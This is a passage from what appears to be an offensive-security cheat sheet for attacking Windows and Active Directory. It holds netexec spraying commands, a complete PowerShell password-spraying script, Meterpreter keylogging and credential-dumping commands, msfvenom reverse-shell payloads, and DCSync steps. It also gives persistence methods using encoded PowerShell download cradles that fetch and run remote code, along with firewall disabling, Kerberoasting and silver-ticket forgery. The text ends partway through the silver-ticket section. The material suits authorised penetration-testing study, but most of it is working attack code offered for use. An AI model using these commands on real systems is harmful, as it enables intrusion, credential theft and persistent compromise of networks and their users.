netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares --continue
netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --pass-pol
netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --lusers
netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --sam
netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --wdigest enable
netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'quser'
netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'net user Administrator /domain' --exec-method smbexec
netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p '-p /PATH/TO/WORDLIST/<WORDLIST>!' -d DOMAIN --continue-on-success
proxychains -q nxc ldap DC1.DOMAIN -d 'DOMAIN' -u 'USER' -p 'PASS' --bloodhound -c All --dns-server IP_dc --dns-tcp
```

#### pypykatz

```c
pypykatz lsa minidump lsass.dmp
pypykatz registry --sam sam system
```

#### Spray-Passwords

##### Spray-Passwords.ps1

```powershell
<#
  .SYNOPSIS
    PoC PowerShell script to demo how to perform password spraying attacks against 
     user accounts in Active Directory (AD), aka low and slow online brute force method.
    Only use for good and after written approval from AD owner.
    Requires access to a Windows host on the internal network, which may perform
     queries against the Primary Domain Controller (PDC).
    Does not require admin access, neither in AD or on Windows host.
    Remote Server Administration Tools (RSAT) are not required.
    
    Should NOT be considered OPSEC safe since:
    - a lot of traffic is generated between the host and the Domain Controller(s).
    - failed logon events will be massive on Domain Controller(s).
    - badpwdcount will iterate on user account objects in scope.
    
    No accounts should be locked out by this script alone, but there are no guarantees.
    NB! This script does not take Fine-Grained Password Policies (FGPP) into consideration.
  .DESCRIPTION
    Perform password spraying attack against user accounts in Active Directory.
  .PARAMETER Pass
    Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'. Do not use together with File or Url."
	
  .PARAMETER File
    Supply a path to a password input file to test multiple passwords for each targeted user account. Do not use together with Pass or Url.
	
  .PARAMETER Url
    Download file from given URL and use as password input file to test multiple passwords for each targeted user account. Do not use together with File or Pass.
	
  .PARAMETER Admins
    Warning: will also target privileged user accounts (admincount=1.)". Default = $false.
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016'
    1. Test the password 'Summer2016' against all active user accounts, except privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins
    1. Test the password 'Summer2016' against all active user accounts, including privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -File .\passwords.txt -Verbose 
    
    1. Test each password in the file 'passwords.txt' against all active user accounts, except privileged user accounts (admincount=1).
    2. Output script progress/status information to console.
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Url 'https://raw.githubusercontent.com/ZilentJack/Get-bADpasswords/master/BadPasswords.txt' -Verbose 
    
    1. Download the password file with weak passwords.
    2. Test each password against all active user accounts, except privileged user accounts (admincount=1).
    3. Output script progress/status information to console.
  .LINK
    Get latest version here: https://github.com/ZilentJack/Spray-Passwords
  .NOTES
    Authored by    : Jakob H. Heidelberg / @JakobHeidelberg / www.improsec.com
    Together with  : CyberKeel / www.cyberkeel.com
    Date created   : 09/05-2016
    Last modified  : 26/06-2016
    Version history:
    - 1.00: Initial public release, 26/06-2016
    Tested on:
     - WS 2016 TP5
     - WS 2012 R2
     - Windows 10
    Known Issues & possible solutions/workarounds:
     KI-0001: -
       Solution: -
    Change Requests for vNext (not prioritized):
     CR-0001: Support for Fine-Grained Password Policies (FGPP).
     CR-0002: Find better way of getting Default Domain Password Policy than "NET ACCOUNTS". Get-ADDefaultDomainPasswordPolicy is not en option as it relies on RSAT.
     CR-0003: Threated approach to test more user/password combinations simultaneously.
     CR-0004: Exception or include list based on username, group membership, SID's or the like.
     CR-0005: Exclude user account that executes the script (password probably already known).
    Verbose output:
     Use -Verbose to output script progress/status information to console.
#>

[CmdletBinding(DefaultParameterSetName='ByPass')]
Param 
(
    [Parameter(Mandatory = $true, ParameterSetName = 'ByURL',HelpMessage="Download file from given URL and use as password input file to test multiple passwords for each targeted user account.")]
    [String]
    $Url = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByFile',HelpMessage="Supply a path to a password input file to test multiple passwords for each targeted user account.")]
    [String]
    $File = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByPass',HelpMessage="Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'")]
    [AllowEmptyString()]
    [String]
    $Pass = '',

    [Parameter(Mandatory = $false,HelpMessage="Warning: will also target privileged user accounts (admincount=1.)")]
    [Switch]
    $Admins = $false

)

# Method to determine if input is numeric or not
Function isNumeric ($x) {
    $x2 = 0
    $isNum = [System.Int32]::TryParse($x, [ref]$x2)
    Return $isNum
}

# Method to get the lockout threshold - does not take FGPP into acocunt
Function Get-threshold
{
    $data = net accounts
    $threshold = $data[5].Split(":")[1].Trim()

    If (isNumeric($threshold) )
        {
            Write-Verbose "threshold is a number = $threshold"
            $threshold = [Int]$threshold
        }
    Else
        {
            Write-Verbose "Threshold is probably 'Never', setting max to 1000..."
            $threshold = [Int]1000
        }
    
    Return $threshold
}

# Method to get the lockout observation window - does not tage FGPP into account
Function Get-Duration
{
    $data = net accounts
    $duration = [Int]$data[7].Split(":")[1].Trim()
    Write-Verbose "Lockout duration is = $duration"
    Return $duration
}

# Method to retrieve the user objects from the PDC
Function Get-UserObjects
{
    # Get domain info for current domain
    Try {$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()}
    Catch {Write-Verbose "No domain found, will quit..." ; Exit}
   
    # Get the DC with the PDC emulator role
    $PDC = ($domainObj.PdcRoleOwner).Name

    # Build the search string from which the users should be found
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName

    # Create a DirectorySearcher to poll the DC
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain

    # Select properties to load, to speed things up a bit
    $Searcher.PropertiesToLoad.Add("samaccountname") > $Null
    $Searcher.PropertiesToLoad.Add("badpwdcount") > $Null
    $Searcher.PropertiesToLoad.Add("badpasswordtime") > $Null

    # Search only for enabled users that are not locked out - avoid admins unless $admins = $true
    If ($Admins) {$Searcher.filter="(&(samAccountType=805306368)(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    Else {$Searcher.filter="(&(samAccountType=805306368)(!(admincount=1))(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    $Searcher.PageSize = 1000

    # Find & return targeted user accounts
    $userObjs = $Searcher.FindAll()
    Return $userObjs
}

# Method to perform auth test with specific username and password
Function Perform-Authenticate
{
    Param
    ([String]$username,[String]$password)

    # Get current domain with ADSI
    $CurrentDomain = "LDAP://"+([ADSI]"").DistinguishedName

    # Try to authenticate
    Write-Verbose "Trying to authenticate as user '$username' with password '$password'"
    $dom = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)
    $res = $dom.Name
    
    # Return true/false
    If ($res -eq $null) {Return $false}
    Else {Return $true}
}

# Validate and parse user supplied url to CSV file of passwords
Function Parse-Url
{
    Param ([String]$url)

    # Download password file from URL
    $data = (New-Object System.Net.WebClient).DownloadString($url)
    $data = $data.Split([environment]::NewLine)

    # Parse passwords file and return results
    If ($data -eq $null -or $data -eq "") {Return $null}
    $passwords = $data.Split(",").Trim()
    Return $passwords
}

# Validate and parse user supplied CSV file of passwords
Function Parse-File
{
   Param ([String]$file)

   If (Test-Path $file)
   {
        $data = Get-Content $file
        
        If ($data -eq $null -or $data -eq "") {Return $null}
        $passwords = $data.Split(",").Trim()
        Return $passwords
   }
   Else {Return $null}
}

# Main function to perform the actual brute force attack
Function BruteForce
{
   Param ([Int]$duration,[Int]$threshold,[String[]]$passwords)

   #Setup variables
   $userObj = Get-UserObjects
   Write-Verbose "Found $(($userObj).count) active & unlocked users..."
   
   If ($passwords.Length -gt $threshold)
   {
        $time = ($passwords.Length - $threshold) * $duration
        Write-Host "Total run time is expected to be around $([Math]::Floor($time / 60)) hours and $([Math]::Floor($time % 60)) minutes."
   }

   [Boolean[]]$done = @()
   [Boolean[]]$usersCracked = @()
   [Int[]]$numTry = @()
   $results = @()

   #Initialize arrays
   For ($i = 0; $i -lt $userObj.Length; $i += 1)
   {
        $done += $false
        $usersCracked += $false
        $numTry += 0
   }

   # Main while loop which does the actual brute force.
   Write-Host "Performing brute force - press [q] to stop the process and print results..." -BackgroundColor Yellow -ForegroundColor Black
   :Main While ($true)
   {
        # Get user accounts
        $userObj = Get-UserObjects
        
        # Iterate over every user in AD
        For ($i = 0; $i -lt $userObj.Length; $i += 1)
        {

            # Allow for manual stop of the while loop, while retaining the gathered results
            If ($Host.UI.RawUI.KeyAvailable -and ("q" -eq $Host.UI.RawUI.ReadKey("IncludeKeyUp,NoEcho").Character))
            {
                Write-Host "Stopping bruteforce now...." -Background DarkRed
                Break Main
            }

            If ($usersCracked[$i] -eq $false)
            {
                If ($done[$i] -eq $false)
                {
                    # Put object values into variables
                    $samaccountnname = $userObj[$i].Properties.samaccountname
                    $badpwdcount = $userObj[$i].Properties.badpwdcount[0]
                    $badpwdtime = $userObj[$i].Properties.badpasswordtime[0]
                    
                    # Not yet reached lockout tries
                    If ($badpwdcount -lt ($threshold - 1))
                    {
                        # Try the auth with current password
                        $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                        If ($auth -eq $true)
                        {
                            Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                            $results += $samaccountnname
                            $results += $passwords[$numTry[$i]]
                            $usersCracked[$i] = $true
                            $done[$i] = $true
                        }

                        # Auth try did not work, go to next password in list
                        Else
                        {
                            $numTry[$i] += 1
                            If ($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                        }
                    }

                    # One more tries would result in lockout, unless timer has expired, let's see...
                    Else 
                    {
                        $now = Get-Date
                        
                        If ($badpwdtime)
                        {
                            $then = [DateTime]::FromFileTime($badpwdtime)
                            $timediff = ($now - $then).TotalMinutes
                        
                            If ($timediff -gt $duration)
                            {
                                # Since observation window time has passed, another auth try may be performed
                                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
                            
                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else 
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }

                            } # Time-diff if

                        }
                        Else
                        {
                            # Verbose-log if $badpwdtime in null. Possible "Cannot index into a null array" error.
                            Write-Verbose "- no badpwdtime exception '$samaccountnname':'$badpwdcount':'$badpwdtime'"
	
	
	
				   # Try the auth with current password
        	                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
			
                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else 
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }
			 
			 
			    
                        } # Badpwdtime-check if

                    } # Badwpdcount-check if

                } # Done-check if

            } # User-cracked if

        } # User loop

        # Check if the bruteforce is done so the while loop can be terminated
        $amount = 0
        For ($j = 0; $j -lt $done.Length; $j += 1)
        {
            If ($done[$j] -eq $true) {$amount += 1}
        }

        If ($amount -eq $done.Length) {Break}

   # Take a nap for a second
   Start-Sleep -m 1000

   } # Main While loop

   If ($results.Length -gt 0)
   {
       Write-Host "Users guessed are:"
       For($i = 0; $i -lt $results.Length; $i += 2) {Write-Host " '$($results[$i])' with password: '$($results[$i + 1])'"}
   }
   Else {Write-Host "No passwords were guessed."}
}

$passwords = $null

If ($Url -ne '')
{
    $passwords = Parse-Url $Url
}
ElseIf($File -ne '')
{
    $passwords = Parse-File $File
}
Else
{
    $passwords = $Pass.Split(",").Trim()   
}

If($passwords -eq $null)
{
    Write-Host "Error in password input, please try again."
    Exit
}

# Get password policy info
$duration = Get-Duration
$threshold = Get-threshold

If ($Admins) {Write-Host "WARNING: also targeting admin accounts." -BackgroundColor DarkRed}

# Call the main function and start the brute force
BruteForce $duration $threshold $passwords
```

##### Usage

```c
.\Spray-Passwords.ps1 -Pass <PASSWORD> -Admin
```

### Exploitation Tools

#### Metasploit

```c
$ sudo msfdb run                   // start database
$ sudo msfdb init                  // database initialization
$ msfdb --use-defaults delete      // delete existing databases
$ msfdb --use-defaults init        // database initialization
$ msfdb status                     // database status
msf6 > workspace                   // metasploit workspaces
msf6 > workspace -a <WORKSPACE>    // add a workspace
msf6 > workspace -r <WORKSPACE>    // rename a workspace
msf6 > workspace -d <WORKSPACE>    // delete a workspace
msf6 > workspace -D                // delete all workspaces
msf6 > db_nmap <OPTIONS>           // execute nmap and add output to database
msf6 > hosts                       // reads hosts from database
msf6 > services                    // reads services from database
msf6 > vulns                       // displaying vulnerabilities
msf6 > search                      // search within metasploit
msf6 > set RHOST <RHOST>           // set remote host
msf6 > set RPORT <RPORT>           // set remote port
msf6 > run                         // run exploit
msf6 > spool /PATH/TO/FILE         // recording screen output
msf6 > save                        // saves current state
msf6 > exploit                     // using module exploit
msf6 > payload                     // using module payload
msf6 > auxiliary                   // using module auxiliary
msf6 > encoder                     // using module encoder
msf6 > nop                         // using module nop
msf6 > show sessions               // displays all current sessions
msf6 > sessions -i 1               // switch to session 1
msf6 > sessions -u <ID>            // upgrading shell to meterpreter
msf6 > sessions -k <ID>            // kill specific session
msf6 > sessions -K                 // kill all sessions
msf6 > jobs                        // showing all current jobs
msf6 > show payloads               // displaying available payloads
msf6 > set VERBOSE true            // enable verbose output
msf6 > set forceexploit true       // exploits the target anyways
msf6 > set EXITFUNC thread         // reverse shell can exit without exit the program
msf6 > set AutoLoadStdapi false    // disables autoload of stdapi
msf6 > set PrependMigrate true     // enables automatic process migration
msf6 > set PrependMigrateProc explorer.exe                        // auto migrate to explorer.exe
msf6 > use post/PATH/TO/MODULE                                    // use post exploitation module
msf6 > use post/linux/gather/hashdump                             // use hashdump for Linux
msf6 > use post/multi/manage/shell_to_meterpreter                 // shell to meterpreter
msf6 > use exploit/windows/http/oracle_event_processing_upload    // use a specific module
C:\> > Ctrl + z                                  // put active meterpreter shell in background
meterpreter > loadstdapi                         // load stdapi
meterpreter > background                         // put meterpreter in background (same as "bg")
meterpreter > shell                              // get a system shell
meterpreter > channel -i <ID>                    // get back to existing meterpreter shell
meterpreter > ps                                 // checking processes
meterpreter > migrate 2236                       // migrate to a process
meterpreter > getuid                             // get the user id
meterpreter > sysinfo                            // get system information
meterpreter > search -f <FILE>                   // search for a file
meterpreter > upload                             // uploading local files to the target
meterpreter > ipconfig                           // get network configuration
meterpreter > load powershell                    // loads powershell
meterpreter > powershell_shell                   // follow-up command for load powershell
meterpreter > powershell_execute                 // execute command
meterpreter > powershell_import                  // import module
meterpreter > powershell_shell                   // shell
meterpreter > powershell_session_remove          // remove
meterpreter > powershell_execute 'Get-NetNeighbor | Where-Object -Property State -NE "Unreachable" | Select-Object -Property IPAddress'                                // network discovery
meterpreter > powershell_execute '1..254 | foreach { "<XXX.XXX.XXX>.${_}: $(Test-Connection -TimeoutSeconds 1 -Count 1 -ComputerName <XXX.XXX.XXX>.${_} -Quiet)" }'    // network scan
meterpreter > powershell_execute 'Test-NetConnection -ComputerName <RHOST> -Port 80 | Select-Object -Property RemotePort, TcpTestSucceeded'                            // port scan
meterpreter > load kiwi                          // load mimikatz
meterpreter > help kiwi                          // mimikatz help
meterpreter > kiwi_cmd                           // execute mimikatz native command
meterpreter > lsa_dump_sam                       // lsa sam dump
meterpreter > dcsync_ntlm krbtgt                 // dc sync
meterpreter > creds_all                          // dump all credentials
meterpreter > creds_msv                          // msv dump
meterpreter > creds_kerberos                     // kerberos dump
meterpreter > creds_ssp                          // ssp dump
meterpreter > creds_wdigest                      // wdigest dump
meterpreter > getprivs                           // get privileges after loading mimikatz
meterpreter > getsystem                          // gain system privileges if user is member of administrator group
meterpreter > hashdump                           // dumps all the user hashes
meterpreter > run post/windows/gather/checkvm    // check status of the target
meterpreter > run post/multi/recon/local_exploit_suggester    // checking for exploits
meterpreter > run post/windows/manage/enable_rdp              // enables rdp
meterpreter > run post/multi/manage/autoroute                 // runs autoroutes
meterpreter > run auxiliary/server/socks4a                    // runs socks4 proxy server
meterpreter > keyscan_start                                   // enabled keylogger
meterpreter > keyscan_dump                                    // showing the output
meterpreter > screenshare                                     // realtime screen sharing
meterpreter > screenshare -q 100                              // realtime screen sharing
meterpreter > record_mic                                      // recording mic output
meterpreter > timestomp                                       // modify timestamps
meterpreter > execute -f calc.exe                             // starts a program on the victim
meterpreter > portfwd add -l <LPORT> -p <RPORT> -r 127.0.0.1    // port forwarding
```

##### Metasploit through Proxychains

```c
proxychains -q msfconsole
```

##### Auxiliary Output Directory

```c
/home/<USERNAME>/.msf4/loot/20200623090635_default_<RHOST>_nvms.traversal_680948.txt
```

##### Meterpreter Listener

###### Generate Payload

Types of payloads Stager or Stageless. Msfvenom reverse shell

https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/

```c
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meterpreter_payload.exe
```

###### Setup Listener for Microsoft Windows

```c
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <LHOST>
LHOST => <LHOST>
msf6 exploit(multi/handler) > set LPORT <LPORT>
LPORT => <LPORT>
msf6 exploit(multi/handler) > run
```

###### Download Files

```c
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>.exe
```

```c
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <LHOST>
LHOST => <LHOST>
msf6 exploit(multi/handler) > set LPORT <LPORT>
LPORT => <LPORT>
msf6 exploit(multi/handler) > run
```

```c
.\<FILE>.exe
```

```c
meterpreter > download *
```

### Post Exploitation

#### Account Operators Group Membership

##### Add User

```c
net user <USERNAME> <PASSWORD> /add /domain
net group "Exchange Windows Permissions" /add <USERNAME>
```

##### Import PowerView

Avoid restrictions

```c
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine
```

```c
powershell -ep bypass
. .\PowerView.ps1
```

##### Add DCSync Rights

```c
$pass = convertto-securestring '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=<DOMAIN>,DC=<DOMAIN>" -PrincipalIdentity <USERNAME> -Rights DCSync
```

##### DCSync

```c
impacket-secretsdump '<USERNAME>:<PASSWORD>@<RHOST>'
```

Obtain an NTL Hash

```c
lsadump::dcsync /domain:testlab.local /user:Administrator
```

```c
C:\Windows\System32\config or C:\Windows\System32\
secretsdump.py -dc-ip IP DOMAIN/USER:PASS@IP
secretsdump.py -sam sam -system system LOCAL
```

##### Persistence

###### Task Scheduler

Powershell

```c
$str = 'IEX ((new-object net.webclient).downloadstring("http://IP:PORT/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```

Linux

```c
set str 'IEX ((new-object net.webclient).downloadstring("http://IP:PORT/a"))'
echo -en $str | iconv -t UTF-16LE | base64 -w 0
```

On victims machine

```c
C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -n "Updater" -m add -o hourly
```

Options

```c
-t is the desired persistence technique.
-c is the command to execute.
-a are any arguments for that command.
-n is the name of the task.
-m is to add the task (you can also remove, check and list).
-o is the task frequency.
```

###### Startup Folder

```c
C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -f "UserEnvSetup" -m add
```

##### System Persistence

###### Sharpersist

```c
SharPersist.exe -t service -c "C:\Windows\payload.exe" -n "legit-svc" -m add
```

###### WMI Event Subsriptions

Import locally

```c
PS> powershell.exe -NoP -Exec ByPass -C Import-Module c:\\temp\\PowerLurk.ps1
```

Download Cradle

```c
PS> powershell.exe -NoP -C "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/PowerLurk.ps1'); Get-WmiEvent"
```
Execute each time notepad.exe is used

```c
powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
```

###### COM Hijacks

```c
PS New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
PS New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\http_x64.dll"
PS New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

#### Active Directory

##### Manual Enumeration

```c
net user /domain
net user <USERNAME> /domain
net group /domain
net group "<GROUP>" /domain
net group "domain admins" /domain
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
Find-LocalAdminAccess
Get-NetSession -ComputerName <RHOST>
Get-NetSession -ComputerName <RHOST> -Verbose
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

Open connection

```c
netsh advfirewall set allprofiles state off
netsh advfirewall add rule name="Open All Ports" dir=in action=allow protocol=TCP localport=0-65535
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v portnumber /d 3389 /f
wmic rdtoggle where servername =' computername ' call setallowtsconnections 1
```

Get domain computer name an ip

```c
nslookup
set type=all
_ldap._tcp.dc._msdcs.DOMAIN_NAME
```

Create a user when admin rights

```c
net user USERNAME PASS /add
net localgroup administrators USERNAME /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f  //opens RDP
netsh advfirewall set allprofiles state off
xfreerdp -v:IP5 -u:USERNAME -p:'PASS' +clipboard -cert:ignore
```

##### Enumeration using PowerView

```c
powershell -ep bypass
Import-Module PowerUp.ps1
. .\PowerUp.ps1
Invoke-AllChecks
Get-NetDomain
Get-Domain //  object for the current
Get-DomainController | select Forest, Name, OSVersion | fl
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetGroup "<GROUP>" | select member
Convert-SidToName S-1-5-21-1987370373-658406905-1781884369-1104
Get-ForestDomain
Get-DomainPolicyData | select -expand SystemAccess
Get-DomainUser -Identity <USER> -Properties DisplayName, MemberOf | fl
Get-DomainComputer // all computers in the domain
Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
Get-DomainGPO -Properties DisplayName | sort -Property DisplayName
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl
Get-DomainTrust
```

##### Service Principal Name (SPN) Enumeration

```c
setspn -L iis_service
Get-NetUser -SPN | select samaccountname,serviceprincipalname
nslookup.exe <RHOST>
```

##### Object Permission Enumeration

| Permission | Description |
| --- | --- |
| GenericAll | Full permissions on object |
| GenericWrite | Edit certain attributes on the object |
| WriteOwner | Change ownership of the object |
| WriteDACL | Edit ACE's applied to object |
| AllExtendedRights | Change password, reset password, etc. |
| ForceChangePassword | Password change for object |
| Self (Self-Membership) | Add ourselves to for example a group |

```c
Get-ObjectAcl -Identity <USERNAME>
Get-ObjectAcl -Identity "<GROUP>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
Get-NetGroup "<GROUP>" | select member
net group "<GROUP>" <USERNAME> /add /domain
net group "<GROUP>" <USERNAME> /del /domain
```

AllExtendedRights

```c
$NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
Set-DomainUserPassword -Identity 'USER_AFFECTED' -AccountPassword $NewPassword
Set-DomainUserPassword -Identity 'USER_AFFECTED' -Verbose

```

##### Share Enumeration

```c
Find-DomainShare
ls \\<RHOST>\sysvol\<DOMAIN>\
ls \\<RHOST>\sysvol\<DOMAIN>\Policies\
cat \\<RHOST>\sysvol\<DOMAIN>\Policies\oldpolicy\old-policy-backup.xml
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vgepPfsN1zMFTiQuyApgR92JE"
```

##### Credential Harvesting

###### Cached Credentials

```c
.\mimikatz.exe
mimikatz # sekurlsa::logonpasswords
dir \\<RHOST>\<SHARE>
mimikatz # sekurlsa::tickets
```

###### AS-REP Roasting

```c
impacket-GetNPUsers -dc-ip <RHOST> -request -outputfile hashes.asreproast <DOMAIN>/<USERNAME>
GetNPUsers.py <DOMAIN>/ -usersfile users.txt -format hashcat -outputfile hashes -dc-ip IP
hashcat -m 18200 hashes.asreproast /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
```

```c
for user in $(cat users); do python3 GetNPUsers.py -no-pass -dc-ip IP DOMAIN/$<USERNAME> | grep -v Impacket; done
python3 GetNPUsers.py DOMAIN/ -usersfile USERFILE
```

With credentials

```c
GetUserSPNs.py Domain/USER:PASS@IP -dc-ip IP 2>/dev/null
```

```c
.\Rubeus.exe asreproast /nowrap
.\Rubeus.exe asreproast /user:<USERNAME> /nowrap
hashcat -m 18200 hashes.asreproast2 /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
john --format=krb5asrep --wordlist=wordlist <USERNAME>
```

Find users

```c
ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
```

###### Kerberoasting

```c
impacket-GetUserSPNs -dc-ip <RHOST> -request <DOMAIN>/<USERNAME>
hashcat -m 13100 hashes.kerberoast /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
```

```c
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
hashcat -m 13100 hashes.kerberoast2 /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
john --format=krb5tgs --wordlist=wordlist <USERNAME>
```

```c
.\Rubeus.exe kerberoast /user:<USERNAME> /nowrap
```

Find users with SPN set

```c
ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
```

###### Silver Tickets

###### Prerequisites

- SPN password hash
- Domain SID
- Target SPN

###### Silver Ticket Forgery

```c
iwr -UseDefaultCredentials http://<RHOST>
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords    // NTLM: 4d28cf5252d39971419580a51484ca09
whoami /user                   // SID: S-1-5-21-1987370270-658905905-1781884369-1105 (S-1-5-21-1987370270-658905905-1781884369)
